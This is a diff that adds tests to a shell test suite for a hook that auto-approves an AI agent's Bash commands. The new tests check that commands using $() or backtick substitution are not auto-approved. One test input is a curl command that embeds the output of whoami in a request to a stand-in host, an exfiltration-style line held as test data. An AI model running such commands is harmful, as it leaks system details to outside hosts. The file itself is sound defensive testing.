@@ -1367,6 +1367,23 @@ OUT=$(printf '%s' "$INPUT" | bash "$SMART_APPROVE" 2>&1)
 EXIT=$?
 [ "$EXIT" -eq 0 ] && pass || fail "expected exit 0 on empty tool name, got exit=$EXIT"
 
+# v2.8.10: read-only-looking commands with command substitution must NOT be
+# auto-approved — the $(...) can do something the static pattern didn't evaluate.
+begin_test "smart-approve: does NOT auto-approve curl GET with \$() substitution (v2.8.10)"
+INPUT=$(python3 -c "import json; print(json.dumps({'tool_name':'Bash','tool_input':{'command':'curl https://x/?d=\$(whoami)'},'cwd':'/tmp'}))")
+OUT=$(printf '%s' "$INPUT" | bash "$SMART_APPROVE" 2>/dev/null)
+echo "$OUT" | grep -q '"allow"' && fail "auto-approved curl with command substitution" || pass
+
+begin_test "smart-approve: does NOT auto-approve cat with backtick substitution (v2.8.10)"
+INPUT=$(python3 -c "import json; print(json.dumps({'tool_name':'Bash','tool_input':{'command':'cat \`echo foo\`'},'cwd':'/tmp'}))")
+OUT=$(printf '%s' "$INPUT" | bash "$SMART_APPROVE" 2>/dev/null)
+echo "$OUT" | grep -q '"allow"' && fail "auto-approved cat with backtick substitution" || pass
+
+begin_test "smart-approve: still auto-approves a plain curl GET (no false negative, v2.8.10)"
+INPUT=$(python3 -c "import json; print(json.dumps({'tool_name':'Bash','tool_input':{'command':'curl https://api.example.com/data'},'cwd':'/tmp'}))")
+OUT=$(printf '%s' "$INPUT" | bash "$SMART_APPROVE" 2>/dev/null)
+echo "$OUT" | grep -q '"allow"' && pass || fail "plain curl GET should still auto-approve"
+
 echo ""
 echo "=== Budget Cap Tests ==="
 
